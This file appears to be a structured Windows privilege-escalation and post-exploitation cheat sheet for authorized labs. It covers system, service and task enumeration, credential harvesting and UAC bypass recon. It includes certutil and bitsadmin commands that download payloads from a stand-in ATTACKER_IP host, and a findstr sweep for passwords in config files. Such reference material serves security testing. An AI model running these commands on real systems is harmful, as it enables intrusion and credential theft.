fields.title: Enumeration - System and Patch Baseline
fields.summary: Collect OS, architecture and hotfix overview in one pass.
fields.prerequisites: Command shell or PowerShell session in an authorized lab host.
fields.commands:
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
whoami /all
fields.explanation: Builds baseline context for privilege escalation and missing patch analysis.
fields.warnings: Output may contain sensitive host metadata.

fields.title: Enumeration - User, Group and Session Mapping
fields.summary: Map local users/groups and currently logged sessions.
fields.commands:
net user
net localgroup administrators
query user
qwinsta
fields.explanation: Helps identify privileged users and potential session hijack opportunities.
fields.warnings: Some commands may be restricted by policy.

fields.title: Services - Unquoted Service Path Audit
fields.summary: Find service binaries vulnerable to unquoted path abuse.
fields.commands: wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"
fields.explanation: Highlights path parsing issues that may allow binary planting.
fields.warnings: Manual validation required before classifying as exploitable.

fields.title: Services - Weak Permission Discovery
fields.summary: Check service DACL and binary ACL weaknesses.
fields.commands:
sc query state= all
for /f "tokens=2 delims=:" %s in ('sc query ^| findstr SERVICE_NAME') do @sc sdshow %s
fields.explanation: Weak service ACLs can allow config changes or binary overwrite.
fields.warnings: Review ACL output carefully; false positives are common.

fields.title: Scheduled Tasks - Enumerate All Tasks
fields.summary: List task names, run-as accounts and execution paths.
fields.explanation: Useful for spotting tasks running as SYSTEM from writable paths.
fields.warnings: Verbose output is large; redirect to file if needed.

fields.title: Scheduled Tasks - Writable Action Path Check
fields.summary: Cross-check task action binaries against writable folders.
fields.prerequisites: Task list and filesystem ACL visibility.
fields.commands:
schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run Run As User"
icacls C:\Path\To\Task\Binary.exe
fields.explanation: Writable binaries executed by privileged tasks are high-risk findings.
fields.warnings: Do not modify binaries outside controlled labs.

fields.title: Credentials - Unattend and Config Harvest
fields.summary: Search unattended installation and config files for secrets.
fields.prerequisites: Read access to common system directories.
fields.commands:
dir /s /b C:\unattend*.xml C:\Windows\Panther\Unattend\*.xml 2>nul
findstr /si password C:\*.xml C:\*.ini C:\*.txt 2>nul
fields.explanation: Legacy deployment files often leak local admin credentials.
fields.warnings: Handle discovered credentials under authorized scope only.

fields.title: Credentials - Saved Credential Store Review
fields.explanation: Saved credentials can expose lateral movement opportunities.
fields.warnings: Avoid executing privileged actions without explicit approval.

fields.title: PowerShell - Execution and Logging Posture
fields.summary: Check execution policy and transcript/module logging state.
fields.explanation: Supports assessing script execution constraints and forensic coverage.
fields.warnings: Policy output varies by user scope and GPO refresh status.

fields.title: PowerShell - AMSI and Defender Recon
fields.summary: Collect defensive posture data from native PowerShell cmdlets.
fields.prerequisites: PowerShell with access to Defender module.
fields.explanation: Helps tune lab tradecraft to endpoint controls.
fields.warnings: On non-Defender hosts these commands may fail gracefully.

fields.title: File Transfer - Certutil Download Workflow
fields.summary: Use certutil to retrieve artifacts from controlled infrastructure.
fields.prerequisites: Outbound HTTP/S allowed in the lab.
fields.commands:
certutil -urlcache -f http://ATTACKER_IP/tool.exe tool.exe
certutil -decode payload.b64 payload.bin
fields.explanation: Common fallback when browsers and PowerShell web cmdlets are restricted.
fields.warnings: Replace ATTACKER_IP with your authorized lab server.

fields.title: File Transfer - SMB Copy via Admin Share
fields.summary: Transfer files over SMB shares in an internal lab network.
fields.prerequisites: Reachable SMB server and valid credentials.
fields.explanation: SMB-based transfer is reliable in segmented internal exercises.
fields.warnings: Do not embed real credentials in scripts outside lab contexts.

fields.title: LOLBAS - Bitsadmin and Certutil Mapping
fields.summary: Document built-in binaries usable for download and execution flow.
fields.commands:
bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/payload.exe C:\Temp\payload.exe
certutil -urlcache -f http://ATTACKER_IP/payload.exe payload.exe
fields.explanation: LOLBAS workflows reduce dependency on external binaries.

fields.title: LOLBAS - Mshta and Rundll32 Discovery
fields.summary: Catalogue native script/dll execution binaries for lab scenarios.
fields.commands:
where mshta
where rundll32
where regsvr32
fields.explanation: Inventory phase before testing signed-binary proxy execution behavior.
fields.warnings: Execution tests should be performed only with explicit authorization.

fields.title: UAC Bypass - Policy and Integrity Recon
fields.summary: Review UAC policy values and current token integrity level.
fields.explanation: Determines whether auto-elevate style vectors are realistic.
fields.warnings: Policy interpretation differs across Windows versions.

fields.title: UAC Bypass - AutoElevate Binary Inventory
fields.summary: Inventory common auto-elevate binaries before manual verification.
fields.prerequisites: Access to system directories and registry queries.
fields.commands:
dir C:\Windows\System32\fodhelper.exe
dir C:\Windows\System32\computerdefaults.exe
reg query HKCU\Software\Classes\ms-settings\shell\open\command
fields.explanation: Recon-only step to prepare controlled UAC bypass validation in labs.
fields.warnings: Do not execute bypass steps on production systems.
